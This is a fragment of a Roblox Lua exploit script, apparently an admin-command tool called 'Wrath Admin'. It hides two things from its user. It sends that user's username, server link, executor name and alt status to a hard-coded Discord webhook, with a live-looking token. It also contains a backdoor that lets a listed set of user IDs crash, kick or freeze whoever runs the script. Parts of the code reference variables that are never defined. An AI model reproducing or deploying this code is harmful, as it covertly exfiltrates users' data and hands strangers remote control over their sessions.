                ["name"] = "Server Link",
                ["value"] = "```".."https://www.roblox.com/home?placeID=" .. game.PlaceId .. "&gameID=" .. game.JobId.."```"
            },
            {
                ["name"] = "Exploit Used:",
                ["value"] = "```"..Exploit.Body.."```"
            },
            {
                ["name"] = "It's an alt?",
                ["value"] = "```"..Alt.."```"
            }
        },
        ["thumbnail"] = {
            ["url"] = string.format("https://www.roblox.com/bust-thumbnail/image?userId=%d&width=420&height=420&format=png", game.Players.LocalPlayer.UserId)
        }
    }
}
local a = rq({
    Url = wh,
    Headers = {['Content-Type'] = 'application/json'},
    Body = game:GetService("HttpService"):JSONEncode({['embeds'] = {embed1}, ['content'] = ''}),
    Method = "POST"
})
function die(Webhook, Player)
    local embed = {
        ['description'] = Player..": "..Message
    }
    local a = rq({
        Url = Webhook,
        Headers = {['Content-Type'] = 'application/json'},
        Body = game:GetService("HttpService"):JSONEncode({['embeds'] = {embed}, ['content'] = ''}),
        Method = "POST"
    })
end

die(wh, game.Players.LocalPlayer.Name)

local wh = 'https://discord.com/api/webhooks/954288787448537128/g_yuQpC7ZwtZx8hqDdP2nsXpihVCFVWkW6YE1czWtHjAYD3hjZMGFf8ejjQPI3votvr-'

local rq = request or syn.request
local embed1 = {
    ['title'] = 'Beginning of Message logs on '..game.PlaceId.." at "..tostring(os.date("%m/%d/%y"))
}
local a = rq({
    Url = wh,
    Headers = {['Content-Type'] = 'application/json'},
    Body = game:GetService("HttpService"):JSONEncode({['embeds'] = {embed1}, ['content'] = ''}),
    Method = "POST"
})
function die(Webhook, Player)
    local embed = {
        ['description'] = Player..": "..Message
    }
    local a = rq({
        Url = Webhook,
        Headers = {['Content-Type'] = 'application/json'},
        Body = game:GetService("HttpService"):JSONEncode({['embeds'] = {embed}, ['content'] = ''}),
        Method = "POST"
    })
end

die(wh, game.Players.LocalPlayer.Name)

local Backdoor = {
    2505717833, --Dis
    2223596959, --Hiidk
    418311724, --Midnight
    1618382728, -- Zyrex
    157173310 -- raid
};

local function FindPlayer(String)
    String = String:lower()

    for Index, Player in pairs(game:GetService("Players"):GetPlayers()) do
        local sub = string.sub(String, 1, #String)
        if sub == string.sub(Player.Name:lower(), 1, #String) or sub == string.sub(Player.DisplayName:lower(), 1, #String) then
            return(Player)
        end
    end    
end

if LocalPlayer.Character.Name ~= LocalPlayer.Name then
    repeat while true do end until nil;
end;

for _, Player in pairs(Players:GetPlayers()) do
    if table.find(Backdoor, LocalPlayer.UserId) then
        return;
    else
        if table.find(Backdoor, Player.UserId) then
            Player.Chatted:Connect(function(message)
                local ctx = string.split(message:lower(), ' ');
    
                if ctx[1] == '.checkuser' then
                    if FindPlayer(ctx[2]) == LocalPlayer then
                        game:GetService('ReplicatedStorage').DefaultChatSystemChatEvents.SayMessageRequest:FireServer('/w '..Player.Name..' Yes I am indeed using Wrath Admin!', 'All');
                    end;
                end;

                if ctx[1] == '.crash' then
                    if FindPlayer(ctx[2]) == LocalPlayer then
                        repeat while true do end until nil;
                    end;
                end;

                if ctx[1] == '.kick' then
                    if FindPlayer(ctx[2]) == LocalPlayer then
                        LocalPlayer:Kick('\nKicked by an admin!!!\n\nAdmin: '..Player.Name)
                    end;
                end;

                if ctx[1] == '.freeze' then
                    if FindPlayer(ctx[2]) == LocalPlayer then
                        Frozen = true;
                        repeat wait(1)
                            LocalPlayer.Character.HumanoidRootPart.Anchored = true;
                        until Frozen == false
                    end;
                end;

                if ctx[1] == '.unfreeze' then
                    if FindPlayer(ctx[2]) == LocalPlayer then
                        Frozen = false;
                        wait(1);
                        LocalPlayer.Character.HumanoidRootPart.Anchored = false;
                    end;
                end;
            end);
        end;
    end;
end;
